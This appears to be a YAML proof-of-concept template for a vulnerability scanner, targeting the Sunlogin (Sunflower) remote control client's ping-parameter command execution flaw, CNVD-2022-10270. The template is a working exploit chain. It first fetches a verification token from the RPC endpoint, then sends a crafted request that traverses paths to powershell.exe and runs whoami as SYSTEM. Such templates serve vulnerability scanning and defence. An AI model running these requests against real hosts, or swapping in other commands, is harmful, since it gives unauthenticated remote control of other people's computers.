name: SunloginClient_ping_RCE__CNVD_2022_10270
transport: http
detail:
  dock: body="Verification failure"
  product: SunloginClient
  homepage: https://sunlogin.oray.com/
  impact: <p>There is a remote execution vulnerability in the ping parameter of the
    Sunflower remote control software, and attackers can use the vulnerability to
    execute arbitrary commands to control server permissions.</p>
  description: <p>Sunflower remote control software is a free integrated remote control
    management tool software that integrates remote control of computer mobile phones,
    remote desktop connection, remote boot, remote management, and support for intranet
    penetration.</p><p>There is a remote execution vulnerability in the ping parameter
    of the Sunflower remote control software, and attackers can use the vulnerability
    to execute arbitrary commands to control server permissions.</p>
rules:
  r1: 
    method: GET
    url: /cgi-bin/rpc?action=verify-haras
    expression: response.status == 200 && response.body.bcontains(b"verify_string")
    output:
      search: "r'\"verify_string\":\"(?<verify>.*?)\",'.bsubmatch(response.body)"
      verify: search["verify"]
  r2:
    method: GET
    url: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami
    headers:
      Cookie: "{{verify}}"
    expression: response.status == 200 && response.body.bcontains(b"system")
expression: r1() && r2()
